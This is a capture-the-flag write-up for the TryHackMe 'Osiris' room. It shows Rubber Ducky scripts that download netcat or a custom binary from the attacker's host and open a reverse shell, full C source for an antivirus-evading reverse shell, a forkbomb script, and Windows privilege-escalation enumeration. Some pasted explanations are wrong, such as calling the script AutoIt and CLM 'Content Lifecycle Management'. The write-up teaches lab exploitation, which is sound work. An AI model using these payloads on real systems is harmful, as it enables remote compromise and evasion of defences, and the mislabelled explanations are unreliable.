---
Can you Quack it?
---

# Osiris — Writeup

## Overview
### Osiris — Writeup
### Osiris — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/fe8053432e57f1958c78240c42e094a2.png)
### Osiris
Start Machine
**Story**
As a final blow to Windcorp's security, you intend to hack the laptop of the CEO, Charlotte Johnson. You heard she has a boatload of Bitcoin, and those seem mighty tasty to you. But they have learned from the previous hacks and have introduced strict security measures.
However, you dropped a wifi RubberDucky on her driveway. Charlotte and her personal assistant Alcino, just drove up to her house and he picks up the bait as they enter the building. Sitting in your black van, just outside her house, you wait for them to plug in the RubberDucky (curiosity kills cats, remember?) and once you see the Ducky’s Wifi network pop up, you make a connection to the RubberDucky and are ready to send her a payload…
This is where your journey begins. Can you come up with a payload and get that sweet revshell? And if you do, can you bypass the tightened security? Remember, antivirus tools aren’t the sharpest tools in the shed, sometimes changing the code a little bit and recompiling the executable can bypass these simplest of detections.
As a final hint_,_ remember that you have pwned their domain controller. You might need to revisit [Ra](https://tryhackme.com/room/ra) or [Ra2](https://tryhackme.com/room/ra2) to extract a key component to manage this task, you will need the keys to the kingdom...
**Info:** To simulate the payload delivery, we have put up a TFTP-server on the target computer. Use that, to upload your RubberDucky-scripts.
**Important:** The TFTP server itself, any software or scripts you find regarding the RubberDucky is not a part of the challenge.
Also; remember you are deploying Ducky-script to a box with limited resources. Give it more time than you usually would, to finish the tasks.
The box will need about 5 minutes before it is fully operational.
Please do **NOT** post write-ups or stream solution until it has been out for at least two weeks.
**The official writeup, is password protected by Flag3**
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.134.236 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
^C
```
```text
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- -Pn 10.10.134.236 -vv --min-rate 1500
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 19:24 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:24
Completed Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed
Initiating Connect Scan at 19:24
Scanning 10.10.134.236 [65535 ports]
Connect Scan Timing: About 23.54% done; ETC: 19:26 (0:01:41 remaining)
Connect Scan Timing: About 46.60% done; ETC: 19:26 (0:01:10 remaining)
Connect Scan Timing: About 69.72% done; ETC: 19:26 (0:00:40 remaining)
Completed Connect Scan at 19:26, 130.84s elapsed (65535 total ports)
Initiating Service scan at 19:26
NSE: Script scanning 10.10.134.236.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 5.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report for 10.10.134.236
Host is up, received user-set.
Scanned at 2023-01-02 19:24:34 EST for 136s
All 65535 scanned ports on 10.10.134.236 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.08 seconds
```
```text
┌──(kali㉿kali)-[~]
└─$ mkdir Osiris
```
```text
┌──(kali㉿kali)-[~]
└─$ cd Osiris
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ tftp 
(to) 
usage: connect host-name [port]
tftp> connect 10.10.134.236

https://github.com/UndedInside/DuckyScripts/blob/main/test_linux_forkbomb.txt

REM Forkbomb to crash Linux machines

DEFAULT_DELAY 700

ALT T

STRING :(){ :!:& };:

ENTER

https://www.jesusninoc.com/03/09/scripts-en-rubber-ducky-parte-1/

open chrome

DELAY 5000

GUI r

DELAY 50

STRING chrome www.jesusninoc.com

ENTER

DELAY 1000

F11

https://forums.hak5.org/topic/42442-3-second-powershell-execution-as-much-powershell-code-as-you-want/

https://github.com/insecurityofthings/jackit/wiki

I see it

https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference

https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration#network-medium-exfiltration

https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration#physical-medium-exfiltration

Finally
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ cat rev.txt                           
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.8.19.103:1337/nc64.exe -outfile c:\windows\temp\nc64.exe
ENTER
DELAY 1000
STRING c:\windows\temp\nc64.exe 10.8.19.103 4444 -e cmd
ENTER

This is a script written in AutoIt, a programming language that is used to automate tasks in Windows. This script is performing the following actions:

1.  Waits for 500 milliseconds (half a second).
2.  Opens the Run dialog in Windows by pressing the "r" key.
3.  Waits for 500 milliseconds.
4.  Types the text "powershell -W hidden" in the Run dialog and presses Enter.
5.  Waits for 1 second.
6.  Presses Enter again.
7.  Types the command "Invoke-WebRequest [http://10.8.19.103/nc64.exe](http://10.8.19.103/nc64.exe) -outfile c:\windows\temp\nc64.exe" and presses Enter. This command downloads a file from the specified URL and saves it to the "temp" folder in the Windows directory.
8.  Waits for 1 second.
9.  Types the command "c:\windows\temp\nc64.exe 10.8.19.103 4444 -e cmd" and presses Enter. This command runs the downloaded file with the specified arguments.

:)
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ locate nc64.exe 
/home/kali/hackthebox/nc64.exe
/home/kali/msdt-follina/msdt-follina/nc64.exe
/home/kali/ra2/nc64.exe
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ cp /home/kali/ra2/nc64.exe nc64.exe
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ ls             
nc64.exe  rev.txt
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ chmod +x nc64.exe 

tftp> put rev.txt
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ tftp              
(to) 10.10.134.236
tftp> put rev.txt
Transfer timed out.

tftp> status
Connected to 10.10.134.236.
Mode: netascii Verbose: off Tracing: off Literal: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds

https://kalilinuxtutorials.com/defendercheck/
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ cat na.c           
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);

void Run(char* Server, int Port) {

HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup"); 

        SOCKET s12;
        struct sockaddr_in addr;
        WSADATA version;
        myWSAStartup(MAKEWORD(2,2), &version);
        s12 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = myinet_addr(Server);
        addr.sin_port = myhtons(Port);

        if (myWSAConnect(s12, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            myclosesocket(s12);
            myWSACleanup();
        } else {
            
            char P1[] = "cm";
            char P2[] = "d.exe";
            char* P = strcat(P1, P2);
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s12;
            CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        Run(argv[1], port);
    }
    else {
        char host[] = "10.8.19.103";
        int port = 1234;
        Run(host, port);
    }
    return 0;
}
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ i686-w64-mingw32-gcc na.c -o na.exe
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ ls
DefenderCheck  na.c  na.exe  nc64.exe  rev.txt
```
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ cat rev.txt                  
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.8.19.103/na.exe -outfile c:\windows\temp\na.exe
ENTER
DELAY 1000
STRING c:\windows\temp\na.exe
ENTER
```

## Exploitation
```text
┌──(kali㉿kali)-[~/Osiris]
└─$ tftp
(to) 10.10.134.236
tftp> status      
Connected to 10.10.134.236.
Mode: netascii Verbose: off Tracing: off Literal: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put na.txt
Transfer timed out.

not work, need to bypass AV

I see it in my machine won't work , in attackbox yep :)

root@ip-10-10-119-139:~/Desktop/test# apt install tftp 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  docutils-common python-bs4 python-chardet python-dicttoxml python-dnspython
  python-html5lib python-jsonrpclib python-lxml python-mechanize
  python-olefile python-pypdf2 python-slowaes python-webencodings
  python-xlsxwriter python3-botocore python3-docutils python3-jmespath
  python3-pygments python3-roman python3-rsa python3-s3transfer xml-core
Use 'apt autoremove' to remove them.
The following NEW packages will be installed
  tftp
0 to upgrade, 1 to newly install, 0 to remove and 716 not to upgrade.
Need to get 16.5 kB of archives.
After this operation, 49.2 kB of additional disk space will be used.
Get:1 http://eu-west-1.ec2.archive.ubuntu.com/ubuntu bionic/universe amd64 tftp amd64 0.17-18ubuntu3 [16.5 kB]
Fetched 16.5 kB in 0s (355 kB/s)
Selecting previously unselected package tftp.
(Reading database ... 377068 files and directories currently installed.)
Preparing to unpack .../tftp_0.17-18ubuntu3_amd64.deb ...
Unpacking tftp (0.17-18ubuntu3) ...
Setting up tftp (0.17-18ubuntu3) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
root@ip-10-10-119-139:~/Desktop/test# tftp
tftp> connect 10.10.94.47
tftp> status
Connected to 10.10.94.47.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put aa.txt
Sent 6 bytes in 0.0 seconds

REM The next three lines execute a command prompt in Windows
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.10.119.139:1234/nc.exe -outfile c:\windows\temp\nc.exe
ENTER
DELAY 1000
STRING c:\windows\temp\nc.exe 10.10.119.139 17777 -e cmd
ENTER

tftp> put rev.txt
Sent 323 bytes in 0.0 seconds

root@ip-10-10-119-139:~/Desktop/test# python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.94.47 - - [03/Jan/2023 16:02:12] "GET /nc.exe HTTP/1.1" 200 -

root@ip-10-10-119-139:~/Desktop/test# nc -lvnp 17777
Listening on [0.0.0.0] (family 0, port 17777)

root@ip-10-10-119-139:~/Desktop/test# nc -lvnp 17777
Listening on [0.0.0.0] (family 0, port 17777)
Connection from 10.10.94.47 50766 received!
Microsoft Windows [Version 10.0.19041.508]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\alcrez>whoami
whoami
windcorp\alcrez

C:\Users\alcrez>cd Desktop
cd Desktop

C:\Users\alcrez\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\Users\alcrez\Desktop

09/19/2020  12:34 AM    <DIR>          .
09/19/2020  12:34 AM    <DIR>          ..
09/19/2020  12:34 AM                45 Flag1.txt
09/16/2020  11:18 AM             1,034 Update VPN.lnk
               2 File(s)          1,079 bytes
               2 Dir(s)  36,793,155,584 bytes free

C:\Users\alcrez\Desktop>type Flag1.txt
type Flag1.txt
THM{89b556686aa61301d4a72a7b12e59368a516c940}

:)

mine
PS C:\Users\User> $ExecutionContext.SessionState.LanguageMode
FullLanguage

machine

C:\Users\alcrez\Desktop>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\alcrez\Desktop> $ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

La variable de entorno $ExecutionContext.SessionState.LanguageMode representa el modo de idioma de PowerShell. El modo de idioma es una configuración que determina el conjunto de características y sintaxis admitidas por la consola de PowerShell. El modo de idioma puede estar configurado en "FullLanguage", "NoLanguage" o "ConstrainedLanguage".

-   "FullLanguage" habilita todas las características de PowerShell.
-   "NoLanguage" deshabilita todas las características de PowerShell.
-   "ConstrainedLanguage" habilita un subconjunto de características de PowerShell que se consideran seguras.

El modo de idioma se puede configurar en el archivo de configuración de PowerShell o mediante el cmdlet Set-ExecutionPolicy.

It is likely that the CLM (Content Lifecycle Management) system has detected that the file is suspected of being malicious and has taken action to protect against it, such as activating antivirus protection or quarantining the file.

---

cacls is a command in the Windows operating system that allows users to view and modify file permissions and access control lists (ACLs). The command can be used to grant or revoke access rights for users or groups to files and directories. The syntax for the cacls command is:

cacls [filename] [options]

Where [filename] is the name of the file or directory that you want to modify the permissions for, and [options] are the options for modifying the ACLs. Some common options for cacls include:

-g [user]:[permission] - grants the specified user the specified permission (e.g. cacls c:\windows\temp -g Administrator:R grants the Administrator read access to the temp directory) -r - removes all permissions for the specified user (e.g. cacls c:\windows\temp -r Administrator removes all permissions for the Administrator on the temp directory) -p [user]:[permission] - sets the specified permission for the specified user (e.g. cacls c:\windows\temp -p Administrator:F sets full control for the Administrator on the temp directory)

---

The command `dir /s c:\temp` will list the contents of the `temp` directory and its subdirectories in the `c:\` directory. The `/s` flag includes subdirectories in the search.

For example, if the `temp` directory contains the following subdirectories and files:

Copy code

`temp ├── folder1 │   ├── file1.txt │   └── file2.txt └── file3.txt`

Running `dir /s c:\temp` would produce the following output:

Copy code

 `Volume in drive C has no label.  Volume Serial Number is 24A6-9E61   Directory of c:\temp  09/23/2022  02:07 PM    <DIR>          folder1 09/23/2022  02:07 PM                12 file3.txt                1 File(s)             12 bytes                2 Dir(s)  78,481,656,576 bytes free  Directory of c:\temp\folder1  09/23/2022  02:07 PM                18 file1.txt 09/23/2022  02:07 PM                24 file2.txt                2 File(s)             42 bytes                0 Dir(s)  78,481,656,576 bytes free`

---

C:\Users\alcrez\Desktop>type "Update VPN.lnk"
type "Update VPN.lnk"
L\ufffdF \ufffd\ufffd\ufffdY\ufffd\ufffd\ufffd
                \ufffd\ufffdY\ufffd\ufffd9\ufffd\ufffdY\ufffd\ufffdQ\ufffd\ufffdP\ufffdO\ufffd \ufffd:i\ufffd+00\ufffd/C:\T10Q\u0655script>	\ufffd\ufffd0Q\u06550Q\u0655.WT
   \ufffd\ufffd|script`2Q0Q\ufffd\ufffd update.vbsF	\ufffd\ufffd0Q\ufffd\ufffd0Q\ufffd\ufffd.dn\ufffd-5update.vbsC-B3N\ufffd\ufffdC:\script\update.vbs..\..\..\script\update.vbs	C:\script!%SystemRoot%\System32\SHELL32.dll`\ufffdXosirisZZ\ufffd\u06f7\ufffdA\ufffd\ufffd3\ufffd\ufffd?\ufffdY\ufffd\ufffd\ufffd\ufffd\ufffd
                                                    )\ufffd\ufffd?ZZ\ufffd\u06f7\ufffdA\ufffd\ufffd3\ufffd\ufffd?\ufffdY\ufffd\ufffd\ufffd\ufffd\ufffd
                                                                               )\ufffd\ufffd?\ufffd	\ufffdE1SPS\ufffd0\ufffd\ufffdC\ufffdG\ufffd\ufffd\ufffd\ufffdsf")d
                                script (C:)\ufffd1SPS0\ufffd%\ufffd\ufffdG\ufffd\ufffd`\ufffd\ufffd\ufffd\ufffd)

 update.vbs@g\ufffd\ufffdY\ufffd\ufffd
                     Q=VBScript Script File@9\ufffd\ufffdY\ufffd\ufffdY1SPS\ufffdjc(=\ufffd\ufffd\ufffd\ufffd\ufffdO\ufffd\ufffd=C:\script\update.vbs91SPS\ufffdmD\ufffd\ufffdpH\ufffdH@.\ufffd=x\ufffdhH\ufffdA2\ufffd0

C:\Users\alcrez\Desktop>dir C:\script\update.vbs
dir C:\script\update.vbs
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\script

09/16/2020  10:47 AM                81 update.vbs
               1 File(s)             81 bytes
               0 Dir(s)  36,796,989,440 bytes free

C:\Users\alcrez\Desktop>type C:\script\update.vbs
type C:\script\update.vbs
Set shell = CreateObject("WScript.Shell")
shell.LogEvent 4, "Update VPN profile"

C:\Users\alcrez\Desktop>dir C:\script
dir C:\script
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\script

09/16/2020  11:18 AM    <DIR>          .
09/16/2020  11:18 AM    <DIR>          ..
09/16/2020  11:17 AM               279 copyprofile.cmd
09/16/2020  10:47 AM                81 update.vbs
               2 File(s)            360 bytes
               2 Dir(s)  36,796,821,504 bytes free

C:\Users\alcrez\Desktop>type c:\script\copyprofile.cmd
type c:\script\copyprofile.cmd
powershell -c "Invoke-WebRequest https://vpn.windcorp.thm/profile.zip -outfile c:\temp\profile.zip"
powershell Expand-Archive c:\temp\profile.zip -DestinationPath c:\temp\
powershell -c "copy-Item -Path 'C:\Temp\*' -Destination 'C:\Program Files\IVPN Client' -Recurse -force"

Update.vbs only writes an event with ID 4 to the event log on the system.
Copyprofile.cmd retrieves a zipfile from a corporate server It extracts that zipfile to c:\temp And it copy everything from c:\temp recursive to c:\program files\IVPN Client\

C:\Users\alcrez\Desktop>cd c:\temp  
cd c:\temp

c:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\Temp

11/22/2020  11:59 AM    <DIR>          .
11/22/2020  11:59 AM    <DIR>          ..
09/16/2020  10:55 AM    <DIR>          OpenVPN
               0 File(s)              0 bytes
               3 Dir(s)  36,810,760,192 bytes free

c:\script>cacls *               
cacls *
c:\script\copyprofile.cmd BUILTIN\Administrators:(ID)F 
                          NT AUTHORITY\SYSTEM:(ID)F 
                          BUILTIN\Users:(ID)R 
                          OSIRIS\scheduler:(ID)F 

c:\script\update.vbs BUILTIN\Administrators:(ID)F 
                     NT AUTHORITY\SYSTEM:(ID)F 
                     BUILTIN\Users:(ID)R 
                     OSIRIS\scheduler:(ID)F 

El comando cacls muestra los permisos de acceso para los archivos y carpetas en el sistema. En este caso, se están mostrando los permisos para los archivos "copyprofile.cmd" y "update.vbs" en la carpeta "c:\script". Cada línea muestra el nombre del usuario o grupo y sus permisos de acceso. Los permisos de acceso pueden ser (ID)F (completo control), (ID)C (lectura y ejecución), (ID)R (sólo lectura) o (ID)N (ningún acceso).

We see a user "scheduler" has full access, but we have only read.

c:\script>dir /s c:\temp
dir /s c:\temp
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\temp

11/22/2020  11:59 AM    <DIR>          .
11/22/2020  11:59 AM    <DIR>          ..
09/16/2020  10:55 AM    <DIR>          OpenVPN
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN

09/16/2020  10:55 AM    <DIR>          .
09/16/2020  10:55 AM    <DIR>          ..
09/16/2020  11:16 AM    <DIR>          x86_64
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN\x86_64

09/16/2020  11:16 AM    <DIR>          .
09/16/2020  11:16 AM    <DIR>          ..
09/16/2020  11:16 AM             1,554 ca.crt
09/16/2020  11:16 AM             5,099 client1.crt
09/16/2020  11:16 AM             1,675 client1.key
09/16/2020  11:16 AM               247 IVPN-Singlehop-Canada-Toronto-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Canada-Toronto.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-France-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-France.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Germany-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Germany.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Hongkong-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Hongkong.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Iceland-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Iceland.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Netherlands-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Netherlands.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Romania-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Romania.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Switzerland-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Switzerland.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-UK-London-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-UK-London.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-Dallas-TX-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-Dallas-TX.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-Los-Angeles-CA-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-Los-Angeles-CA.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-New-Jersey-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-New-Jersey.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-SaltLakeCity-UT-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-SaltLakeCity-UT.conf
09/16/2020  11:16 AM               636 ta.key
              30 File(s)         15,308 bytes

     Total Files Listed:
              30 File(s)         15,308 bytes
               8 Dir(s)  36,803,346,432 bytes free

From the enumeration, we know that the `Update VPN.lnk` is a shortcut to run `update.vbs` script in the `C:\script\` folder.

And `C:\script\` folder contain 2 files --- `update.vbs` and `copyprofile.cmd`, these 2 files work together to perform below action.

The `update.vbs` only writes an event with ID 4 to the event log on the system.

However `copyprofile.cmd` does some interesting stuff, it started with download VPN profile as a zip file from `vpn.windcorp.thm` to `C:\temp\`, and then unzip it to the destination `C:\Program Files\IVPN Client`.

Searching for unquoted service paths, actually reveals two services with that flaw.

PS C:\Temp> cmd
cmd
Microsoft Windows [Version 10.0.19041.508]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Temp>cd c:\program files\IVPN Client
cd c:\program files\IVPN Client

c:\Program Files\IVPN Client>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\Program Files\IVPN Client

11/22/2020  11:59 AM    <DIR>          .
11/22/2020  11:59 AM    <DIR>          ..
01/14/2015  05:41 AM             4,284 1
09/13/2020  03:42 AM    <DIR>          de
01/07/2015  02:04 PM                60 down.bat
09/13/2020  03:42 AM    <DIR>          en
01/07/2015  02:04 PM                35 envinfo.bat
09/13/2020  03:42 AM    <DIR>          es
09/13/2020  03:42 AM    <DIR>          etc
09/13/2020  03:42 AM    <DIR>          fr
09/13/2020  03:42 AM    <DIR>          it
05/12/2015  10:11 AM           879,104 IVPN Client.exe
01/27/2015  02:09 AM             4,106 IVPN Client.exe.config
05/12/2015  10:11 AM            77,824 IVPN Firewall Native.dll
05/12/2015  10:11 AM            49,152 IVPN Firewall.dll
05/12/2015  10:11 AM            33,280 IVPN Service.exe
01/27/2015  02:09 AM               144 IVPN Service.exe.config
05/12/2015  10:11 AM            93,696 IVPN.Core.dll
05/12/2015  10:11 AM            10,240 ivpncli.exe
01/27/2015  02:09 AM               161 ivpncli.exe.config
04/10/2015  09:23 PM            24,224 ivpncli.vshost.exe
01/27/2015  02:09 AM               161 ivpncli.vshost.exe.config
06/18/2013  04:28 AM               490 ivpncli.vshost.exe.manifest
02/18/2015  01:34 PM            34,304 IVPNCommon.dll
09/13/2020  03:42 AM    <DIR>          ja
09/13/2020  03:42 AM    <DIR>          ko
01/03/2023  10:26 AM    <DIR>          log
05/12/2015  10:11 AM           823,296 MahApps.Metro.dll
05/12/2015  10:11 AM           276,281 MahApps.Metro.xml
05/12/2015  10:11 AM            29,184 ManagedWifi.dll
05/12/2015  10:11 AM             9,216 NetworkHelpers.dll
02/20/2015  01:42 AM           513,536 Newtonsoft.Json.dll
02/20/2015  01:42 AM           494,336 Newtonsoft.Json.xml
09/13/2020  03:42 AM    <DIR>          OpenVPN
09/13/2020  03:42 AM    <DIR>          Resources
05/25/2010  07:26 AM            39,936 System.Windows.Interactivity.dll
05/25/2010  07:12 AM            62,128 System.Windows.Interactivity.xml
09/13/2020  03:42 AM           111,540 Uninstall.exe
01/07/2015  02:04 PM                59 up.bat
09/13/2020  03:42 AM    <DIR>          zh-Hans
09/13/2020  03:42 AM    <DIR>          zh-Hant
              26 File(s)      3,570,777 bytes
              15 Dir(s)  36,796,395,520 bytes free

c:\Program Files\IVPN Client>wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
IVPN Client                                                                         IVPN Client                               C:\Program Files\IVPN Client\IVPN Service.exe                                          Auto       
nordvpn-service                                                                     nordvpn-service                           C:\Program Files\NordVPN\nordvpn-service.exe                                           Auto    

La orden wmic service obtiene información sobre los servicios del sistema, incluyendo el nombre del servicio, el nombre para mostrar en la interfaz de usuario, la ruta del archivo ejecutable del servicio y el modo de inicio. El resultado se envía a la orden findstr, que busca cadenas de texto en su entrada y muestra las líneas que coinciden.

La opción "/i" hace que la búsqueda sea insensible a mayúsculas y minúsculas y la opción "/v" excluye las líneas que contienen la cadena especificada. Por lo tanto, la orden findstr busca los servicios que están configurados para iniciarse automáticamente (startmode "auto") y excluye aquellos cuyo archivo ejecutable esté ubicado en la carpeta "c:\windows" o que contengan dobles comillas.

Checking access, shows we don’t have any write on the nordvpnservice

c:\Program Files\IVPN Client>cacls "c:\program files\nordvpn"
cacls "c:\program files\nordvpn"
c:\program files\NordVPN NT SERVICE\TrustedInstaller:(ID)F 
                         NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
                         NT AUTHORITY\SYSTEM:(ID)F 
                         NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
                         BUILTIN\Administrators:(ID)F 
                         BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
                         BUILTIN\Users:(ID)R 
                         BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
                                                       GENERIC_READ
                                                       GENERIC_EXECUTE
 
                         CREATOR OWNER:(OI)(CI)(IO)(ID)F 
